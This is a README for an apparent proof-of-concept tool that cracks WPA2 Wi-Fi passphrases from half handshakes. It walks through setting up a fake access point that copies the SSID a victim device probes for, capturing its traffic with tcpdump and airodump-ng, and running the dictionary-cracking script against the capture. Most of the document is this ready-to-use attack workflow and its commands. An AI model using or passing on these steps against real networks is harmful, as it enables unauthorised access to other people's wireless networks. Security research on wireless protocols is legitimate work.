# WPA2-HalfHandshake-Crack
This is a POC to show it is possible to capture enough of a handshake with a user from a fake AP to crack a WPA2 network without an AP

## Install

```
  $ sudo python setup.py install
```

## Sample use

```
  $ python halfHandshake.py -r sampleHalfHandshake.cap -m 48d224f0d128 -s "no place like 127.0.0.1"
```

* **-r** Where to read input pcap file with half handshake (works with full handshakes too)
* **-m** AP mac address
* **-s** AP SSID
* **-d** (optional) Where to read dictionary from

## Capturing half handshakes

* Setup a WPA2 wifi network with an SSID the same as the desired device probe. The passphrase can be anything

  In ubuntu this can be done here

http://ubuntuhandbook.org/index.php/2014/09/3-ways-create-wifi-hotspot-ubuntu/

* Capture traffic on this interface.

  In linux this can be achived with TCPdump
```
sudo tcpdump -i wlan0 -s 65535 -w file.cap
```

* To listen for device probes the aircrack suite can be used as follows

```
sudo airmon-ng start wlan0
sudo airodump-ng mon0
```
  You should begin to see device probes with BSSID set as (not associated) appearing at the bottom. 
